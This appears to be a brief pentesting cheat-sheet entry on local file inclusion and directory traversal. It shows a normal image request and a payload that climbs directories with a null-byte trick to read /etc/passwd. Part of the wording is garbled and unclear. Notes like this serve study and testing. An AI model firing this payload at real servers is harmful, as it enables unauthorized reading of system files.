# LFI
### Directory traversal or File path traversal
replaze lfi payloads:

%00index.html
to
EJP:
```bash
/image?filename=25.jpg
```

```bash
/image?filename=../../../etc/passwd%00.png
```
